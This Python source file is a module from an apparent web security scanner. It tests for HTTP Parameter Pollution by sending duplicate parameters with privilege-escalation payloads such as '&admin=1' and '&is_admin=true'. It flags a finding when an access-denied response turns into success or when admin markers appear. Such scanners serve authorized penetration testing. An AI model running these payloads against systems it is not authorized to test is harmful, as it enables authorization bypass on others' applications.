#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - HTTP Parameter Pollution Module
Detects HPP vulnerabilities by sending duplicate parameters and
checking for logic bypasses, authorization changes, or behaviour
differences.
"""

from urllib.parse import urlparse, urlunparse


from config import Payloads, Colors
from modules.base import BaseModule


class HPPModule(BaseModule):
    """HTTP Parameter Pollution Testing Module"""

    name = "HTTP Parameter Pollution"
    vuln_type = "hpp"

    HPP_PAYLOADS = Payloads.HPP_PAYLOADS + [
        "&admin=1",
        "&is_admin=true",
        "&privilege=admin",
        "&verified=true",
        "&approved=1",
        "&status=active",
    ]

    def __init__(self, engine):
        super().__init__(engine)

    def test(self, url: str, method: str, param: str, value: str):
        """Test a parameter for HPP by sending duplicate parameters."""
        # 1. Baseline: normal request
        try:
            baseline_resp = self.requester.request(
                url,
                method,
                data={param: value},
            )
            if not baseline_resp:
                return
        except Exception:
            return

        # 2. Duplicate parameter with different values
        for payload in self.HPP_PAYLOADS:
            try:
                # Build data with duplicate parameter
                if method.upper() == "GET":
                    # Append duplicate param to query string
                    parsed = urlparse(url)
                    qs = parsed.query
                    dup_qs = f"{qs}&{param}={value}{payload}" if qs else f"{param}={value}{payload}"
                    test_url = urlunparse(parsed._replace(query=dup_qs))
                    response = self.requester.request(test_url, "GET")
                else:
                    data_str = f"{param}={value}&{param}={value}{payload}"
                    response = self.requester.request(
                        url,
                        method,
                        data=data_str,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                    )

                if response is None:
                    continue

                # Detect HPP: significant behaviour change
                if self._detect_hpp(baseline_resp, response, payload):
                    from core.engine import Finding

                    finding = Finding(
                        technique="HTTP Parameter Pollution",
                        url=url,
                        param=param,
                        payload=f"{param}={value}{payload}",
                        evidence=self._get_evidence(baseline_resp, response),
                        severity="MEDIUM",
                        confidence=0.7,
                    )
                    self.engine.add_finding(finding)
                    return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'HPP test error: {e}')}")

    def test_url(self, url: str):
        """URL-level HPP test (not applicable)."""

    def _detect_hpp(self, baseline, response, payload):
        """Check for HPP indicators — only PRIVILEGE-elevating transitions.

        Prior rules fired on ANY status change or ±20% length delta, which
        is normal noise for search / list endpoints. Real HPP signal is a
        transition from denied→allowed (403/401→200) or a login-state
        change; body-length and generic keywords are too noisy to keep.
        """
        b_status = getattr(baseline, "status_code", 0)
        r_status = getattr(response, "status_code", 0)
        # Auth-state transition
        if b_status in (401, 403) and r_status in (200, 302):
            return True
        # New privilege markers, but ONLY the strong ones and only when
        # baseline had NEITHER the marker NOR anything resembling a login
        # page (welcome/success are too weak — dropped).
        resp_body = (response.text or "").lower()
        base_body = (baseline.text or "").lower()
        for kw in ("admin panel", "administrator dashboard", "role=admin", "is_admin=true", "sudo"):
            if kw in resp_body and kw not in base_body:
                return True
        return False

    def _get_evidence(self, baseline, response):
        """Build evidence string from the two responses."""
        parts = [
            f"Baseline status: {baseline.status_code}",
            f"HPP status: {response.status_code}",
            f"Baseline length: {len(baseline.text or '')}",
            f"HPP length: {len(response.text or '')}",
        ]
        return "; ".join(parts)
